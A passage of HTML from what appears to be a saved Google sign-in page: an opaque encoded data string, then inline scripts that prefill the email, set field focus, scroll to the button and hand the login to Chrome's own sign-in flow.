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');
  </script>
<script>
  function gaia_parseFragment() {
  var hash = location.hash;
  var params = {};
  if (!hash) {
  return params;
  }
  var paramStrs = decodeURIComponent(hash.substring(1)).split('&');
  for (var i = 0; i < paramStrs.length; i++) {
      var param = paramStrs[i].split('=');
      params[param[0]] = param[1];
    }
    return params;
  }

  function gaia_prefillEmail() {
    var form = null;
    if (document.getElementById) {
      form = document.getElementById('gaia_loginform');
    }

    if (form && form.Email &&
        (form.Email.value == null || form.Email.value == '')
        && (form.Email.type != 'hidden')) {
      hashParams = gaia_parseFragment();
      if (hashParams['Email'] && hashParams['Email'] != '') {
        form.Email.value = hashParams['Email'];
      }
    }
  }

  
  try {
    gaia_prefillEmail();
  } catch (e) {
  }
  
</script>
<script>
  function gaia_setFocus() {
  var form = null;
  var isFocusableField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  if (inputElement.type != 'hidden' && inputElement.focus &&
  inputElement.style.display != 'none') {
  return true;
  }
  return false;
  };
  var isFocusableErrorField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  var hasError = inputElement.className.indexOf('form-error') > -1;
  if (hasError && isFocusableField(inputElement)) {
  return true;
  }
  return false;
  };
  var isFocusableEmptyField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  var isEmpty = inputElement.value == null || inputElement.value == '';
  if (isEmpty && isFocusableField(inputElement)) {
  return true;
  }
  return false;
  };
  if (document.getElementById) {
  form = document.getElementById('gaia_loginform');
  }
  if (form) {
  var userAgent = navigator.userAgent.toLowerCase();
  var formFields = form.getElementsByTagName('input');
  for (var i = 0; i < formFields.length; i++) {
        var currentField = formFields[i];
        if (isFocusableErrorField(currentField)) {
          currentField.focus();
          
          var currentValue = currentField.value;
          currentField.value = '';
          currentField.value = currentValue;
          return;
        }
      }
      
      
      
        for (var j = 0; j < formFields.length; j++) {
          var currentField = formFields[j];
          if (isFocusableEmptyField(currentField)) {
            currentField.focus();
            return;
          }
        }
      
    }
  }

  
  
    gaia_attachEvent(window, 'load', gaia_setFocus);
  
  
</script>
<script>
  var gaia_scrollToElement = function(element) {
  var calculateOffsetHeight = function(element) {
  var curtop = 0;
  if (element.offsetParent) {
  while (element) {
  curtop += element.offsetTop;
  element = element.offsetParent;
  }
  }
  return curtop;
  }
  var siginOffsetHeight = calculateOffsetHeight(element);
  var scrollHeight = siginOffsetHeight - window.innerHeight +
  element.clientHeight + 0.02 * window.innerHeight;
  window.scroll(0, scrollHeight);
  }
</script>
<script>
(function() {
  var $ = function(id) { return document.getElementById(id); };
  var gaiaLoginForm = $('gaia_loginform');
  var chromeExt = 'chrome-extension://mfffpogegjflfpflabcdkioaeobkgjik';
  var chromeSigninUrl = 'chrome://chrome-signin';
  var chromeOsUrl = 'chrome://oobe';
  var chromeWebview = undefined;
  onMessage = function(e) {
  if (e.origin == chromeSigninUrl || e.origin == chromeOsUrl) {
  chromeWebview = e.source;
  }
  };
  window.addEventListener('message', onMessage);
  gaia_onChromeLoginSubmit = function(e) {
  if (!chromeWebview && window == window.parent) {
  return;
  }
  if (gaiaLoginForm['Email'] && gaiaLoginForm['Passwd']) {
  var checkboxElement = $('advanced-box');
  var chooseWhatToSync = checkboxElement && checkboxElement.checked;
  var attemptToken = new Date().getTime();
  var msg = {method: 'attemptLogin',
  email: gaiaLoginForm['Email'].value,
  password: gaiaLoginForm['Passwd'].value,
  attemptToken: attemptToken,
  chooseWhatToSync: chooseWhatToSync};
  if (chromeWebview) {
  chromeWebview.postMessage(msg, chromeSigninUrl);
  } else {
  window.parent.postMessage(msg, chromeExt);
  }
  console.log('Credentials sent');
  var continueUrlElement = gaiaLoginForm['continue'];
  if (continueUrlElement) {
  var prevAttemptIndex = continueUrlElement.value.indexOf('?attemptToken');
  if (prevAttemptIndex != -1) {
  continueUrlElement.value = continueUrlElement.value.substr(
  0, prevAttemptIndex);
  }
  continueUrlElement.value += '?attemptToken=' + attemptToken;
  }
  }
  };
  gaia_attachEvent(gaiaLoginForm, 'submit', gaia_onChromeLoginSubmit);
})();
</script>
<script>
  (function(){
  var signinInput = document.getElementById('signIn');
  gaia_onLoginSubmit = function() {
  try {
  document.bg.invoke(function(response) {
  document.getElementById('bgresponse').value = response;
  });
  } catch (err) {
  document.getElementById('bgresponse').value = '';
  }
  return true;
  }
  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
  var signinButton = document.getElementById('signIn');
  gaia_attachEvent(window, 'load', function(){
  gaia_scrollToElement(signinButton);
  });
  })();
</script>
  

</html>